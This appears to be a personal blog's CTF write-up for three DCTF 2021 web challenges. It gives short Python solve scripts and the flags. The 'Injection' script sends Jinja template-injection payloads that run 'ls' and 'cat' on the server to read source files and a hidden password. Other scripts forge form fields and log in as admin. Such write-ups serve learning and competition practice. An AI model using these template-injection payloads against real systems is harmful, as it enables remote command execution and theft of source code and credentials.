@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="(Web) Simple web [xxx pts]1234567from pwn import *import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;dctf1-chall-simple-web.westeurope.azurecontainer.io:8080&#x2F;flag&quot;FormData &#x3D; &amp;#123;&amp;#x27;flag&amp;#x27;:1, &amp;#x27;auth&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DCTF 2021 Write Up">
+<meta property="og:url" content="http://example.com/2021/05/17/2021-05-17-dCTF-2021/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="(Web) Simple web [xxx pts]1234567from pwn import *import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;dctf1-chall-simple-web.westeurope.azurecontainer.io:8080&#x2F;flag&quot;FormData &#x3D; &amp;#123;&amp;#x27;flag&amp;#x27;:1, &amp;#x27;auth&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-17T00:00:02.000Z">
+<meta property="article:modified_time" content="2021-05-16T23:28:56.863Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="ETC">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>DCTF 2021 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/05/17/2021-05-17-3kCTF-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/05/06/2021-01-15-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/17/2021-05-17-dCTF-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&text=DCTF 2021 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&is_video=false&description=DCTF 2021 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DCTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-dCTF-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&name=DCTF 2021 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&t=DCTF 2021 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Simple-web-xxx-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Simple web [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Injection-xxx-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Injection [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Very-secure-website-200-pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) Very secure website [200 pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DCTF 2021 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-17T00:00:02.000Z" itemprop="datePublished">2021-05-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ETC/" rel="tag">ETC</a>, <a class="tag-link-link" href="/tags/SSTI/" rel="tag">SSTI</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web-Simple-web-xxx-pts"><a href="#Web-Simple-web-xxx-pts" class="headerlink" title="(Web) Simple web [xxx pts]"></a>(Web) Simple web [xxx pts]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag&quot;</span></span><br><span class="line">FormData = &#123;<span class="string">&#x27;flag&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;auth&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url, data=FormData).text</span><br><span class="line">log.info(res)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FLAG : dctf{w3b_c4n_b3_fun_r1ght?}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Injection-xxx-pts"><a href="#Web-Injection-xxx-pts" class="headerlink" title="(Web) Injection [xxx pts]"></a>(Web) Injection [xxx pts]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Occur SSTI Vuln in 404 page</span></span><br><span class="line">url = <span class="string">&#x27;http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/&#x27;</span></span><br><span class="line">ssti = [<span class="string">&quot;&#123;&#123;79&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat app.py&#x27;).read()&#125;&#125;&quot;</span>]</span><br><span class="line">string = [<span class="string">&quot;Checked SSTI&quot;</span>, <span class="string">&quot;Execute ls&quot;</span>, <span class="string">&quot;Show app.py&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Exploit&quot;</span>)</span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="comment"># If u look at app.py, you can see that /login is using validate_login().</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssti)):</span><br><span class="line">    res = requests.get(url+ssti[i]).text.replace(<span class="string">&quot;&amp;#39;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">    log.info(string[i])</span><br><span class="line">    log.info(<span class="string">&quot; &gt; &quot;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="comment"># If u look at validate_login() in securit.py, you can know the password used by the server.</span></span><br><span class="line">ssti = [<span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls lib&#x27;).read()&#125;&#125;&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat lib/security.py&#x27;).read()&#125;&#125;&quot;</span>]</span><br><span class="line">string = [<span class="string">&quot;Checked lib&quot;</span>, <span class="string">&quot;Show lib/security.py&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssti)):</span><br><span class="line">    res = requests.get(url + ssti[i]).text.replace(<span class="string">&quot;&amp;#39;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">    log.info(string[i])</span><br><span class="line">    log.info(<span class="string">&quot; &gt; &quot;</span> + res)</span><br><span class="line"></span><br><span class="line">valid_password = <span class="string">&quot;==QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ&quot;</span></span><br><span class="line">log.info(base64.b64decode(valid_password[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FLAG : dctf{4ll_us3r_1nput_1s_3v1l}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Very-secure-website-200-pts"><a href="#Web-Very-secure-website-200-pts" class="headerlink" title="(Web) Very secure website [200 pts]"></a>(Web) Very secure website [200 pts]</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;dctf1-chall-very-secure-site.westeurope.azurecontainer.io&#x2F;login.php?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&#39;</span><br><span class="line">account &#x3D; [&#39;admin&#39;, &#39;479763000&#39;]</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(url.format(account[0], account[1])).text</span><br><span class="line">log.info(&quot;Exploit&quot;)</span><br><span class="line">log.info(res)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FLAG : dctf{It’s_magic._I_ain’t_gotta_explain_shit.}</p>
+</blockquote>
+<hr>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Simple-web-xxx-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Simple web [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Injection-xxx-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) Injection [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Very-secure-website-200-pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) Very secure website [200 pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/17/2021-05-17-dCTF-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&text=DCTF 2021 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&is_video=false&description=DCTF 2021 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DCTF 2021 Write Up&body=Check out this article: http://example.com/2021/05/17/2021-05-17-dCTF-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&title=DCTF 2021 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&name=DCTF 2021 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/17/2021-05-17-dCTF-2021/&t=DCTF 2021 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'https-pocas-kr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
